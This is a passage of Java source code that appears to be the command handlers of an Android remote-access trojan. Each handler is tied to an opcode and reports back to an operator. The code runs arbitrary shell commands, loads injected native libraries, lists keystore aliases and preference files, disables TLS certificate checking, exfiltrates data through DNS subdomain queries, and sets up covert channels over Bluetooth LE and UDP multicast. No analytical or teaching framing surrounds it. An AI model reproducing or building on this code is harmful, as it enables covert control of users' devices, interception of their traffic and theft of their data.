    // ══════════════════════════════════════════════════════════════════════════
    //  [0x20] NATIVE_SHELL_EXEC - execute shell via JNI/Runtime
    // ══════════════════════════════════════════════════════════════════════════
    private void handleNativeShell(String cmd) throws Exception {
        executor.execute(() -> {
            try {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c", cmd);
                pb.redirectErrorStream(true);
                Process p = pb.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line).append("\n");
                p.waitFor();
                sendResult("SHELL_OUT:" + sb.toString());
            } catch (Exception e) {
                try { sendResult("SHELL_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
            }
        });
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x21] INJECT_SO_LIBRARY - load .so from payload bytes
    // ══════════════════════════════════════════════════════════════════════════
    private void handleInjectSoLibrary(byte[] soBytes) throws Exception {
        File tmp = new File(ctx.getFilesDir(), "injected_" + System.currentTimeMillis() + ".so");
        try (FileOutputStream fos = new FileOutputStream(tmp)) { fos.write(soBytes); }
        tmp.setExecutable(true);
        try {
            System.load(tmp.getAbsolutePath());
            sendResult("SO_LOADED:" + tmp.getAbsolutePath());
        } catch (UnsatisfiedLinkError e) {
            sendResult("SO_ERROR:" + e.getMessage());
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x22] MEMORY_DUMP_KEYSTORE - extract encryption key hints via reflection
    // ══════════════════════════════════════════════════════════════════════════
    @SuppressLint("PrivateApi")
    private void handleMemoryDumpKeystore() throws Exception {
        JSONObject result = new JSONObject();
        try {
            java.security.KeyStore ks = java.security.KeyStore.getInstance("AndroidKeyStore");
            ks.load(null);
            java.util.Enumeration<String> aliases = ks.aliases();
            JSONArray arr = new JSONArray();
            while (aliases.hasMoreElements()) arr.put(aliases.nextElement());
            result.put("keystore_aliases", arr);
            result.put("provider", ks.getProvider().getName());
        } catch (Exception e) {
            result.put("error", e.getMessage());
        }
        // SharedPreferences keys
        try {
            File spDir = new File(ctx.getApplicationInfo().dataDir, "shared_prefs");
            JSONArray spFiles = new JSONArray();
            if (spDir.exists()) for (File f : spDir.listFiles()) spFiles.put(f.getName());
            result.put("shared_prefs_files", spFiles);
        } catch (Exception ignored) {}
        sendResult("KEYSTORE_DUMP:" + result.toString());
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x23] HOOK_CRYPTO_RUNTIME - intercept TLS/crypto (reflection-based)
    // ══════════════════════════════════════════════════════════════════════════
    @SuppressLint("PrivateApi")
    private void handleHookCryptoRuntime(String targetPackage) throws Exception {
        // Install trust-all X509 manager to bypass SSL pinning
        javax.net.ssl.TrustManager[] tm = new javax.net.ssl.TrustManager[] {
            new javax.net.ssl.X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
                public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
            }
        };
        javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
        sc.init(null, tm, new java.security.SecureRandom());
        javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        javax.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true);
        sendResult("CRYPTO_HOOK_OK:SSL_PINNING_DISABLED");
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x30] DNS_DATA_TUNNELING - exfil data via DNS TXT queries
    // ══════════════════════════════════════════════════════════════════════════
    private void handleDnsTunneling(String payload) throws Exception {
        JSONObject p   = new JSONObject(payload);
        String data    = p.optString("data", "");
        String dnsHost = p.optString("dns",  "8.8.8.8");
        // Encode data as hex sub-domains and query
        executor.execute(() -> {
            try {
                byte[] raw = data.getBytes("UTF-8");
                String hex = bytesToHex(raw);
                // Split into 60-char chunks (DNS label limit)
                int chunkSize = 60;
                for (int i = 0; i < hex.length(); i += chunkSize) {
                    String chunk = hex.substring(i, Math.min(i + chunkSize, hex.length()));
                    String query = chunk + ".exfil." + dnsHost;
                    try { InetAddress.getByName(query); } catch (Exception ignored) {}
                    Thread.sleep(100);
                }
                sendResult("DNS_TUNNEL_SENT:" + raw.length + " bytes");
            } catch (Exception e) {
                try { sendResult("DNS_TUNNEL_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
            }
        });
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x31] L2CAP_BLE_TUNNEL - Bluetooth BLE advertisement covert channel
    // ══════════════════════════════════════════════════════════════════════════
    private void handleBleTunnel(String payload) throws Exception {
        // BLE advertising piggyback (requires BLUETOOTH_ADVERTISE on API 31+)
        try {
            android.bluetooth.BluetoothAdapter adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
            if (adapter != null && adapter.isEnabled()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    android.bluetooth.le.BluetoothLeAdvertiser adv = adapter.getBluetoothLeAdvertiser();
                    if (adv != null) {
                        byte[] data = payload.getBytes("UTF-8");
                        byte[] mfData = new byte[Math.min(data.length, 25)];
                        System.arraycopy(data, 0, mfData, 0, mfData.length);
                        android.bluetooth.le.AdvertiseData advData = new android.bluetooth.le.AdvertiseData.Builder()
                            .addManufacturerData(0xFFFF, mfData).build();
                        android.bluetooth.le.AdvertiseSettings settings = new android.bluetooth.le.AdvertiseSettings.Builder()
                            .setAdvertiseMode(android.bluetooth.le.AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                            .build();
                        adv.startAdvertising(settings, advData, new android.bluetooth.le.AdvertiseCallback() {});
                        sendResult("BLE_TUNNEL_STARTED");
                        return;
                    }
                }
            }
        } catch (Exception e) { Log.w(TAG, "BLE: " + e.getMessage()); }
        sendResult("BLE_TUNNEL_NA:No BLE available");
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x32] THREAD_MESH_BRIDGE - Thread/Matter IoT covert bridge stub
    // ══════════════════════════════════════════════════════════════════════════
    private void handleThreadMeshBridge(String payload) throws Exception {
        // Use UDP multicast as Thread-like bridge fallback
        executor.execute(() -> {
            try {
                JSONObject p = new JSONObject(payload);
                String host  = p.optString("host", "224.0.0.251"); // mDNS multicast
                int port     = p.optInt("port", 5353);
                byte[] data  = p.optString("data", "MESH_PING").getBytes("UTF-8");
                DatagramSocket ds = new DatagramSocket();
                ds.send(new DatagramPacket(data, data.length, InetAddress.getByName(host), port));
                ds.close();
                sendResult("MESH_BRIDGE_SENT:" + data.length + "b");
            } catch (Exception e) {
                try { sendResult("MESH_BRIDGE_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
            }
        });
    }

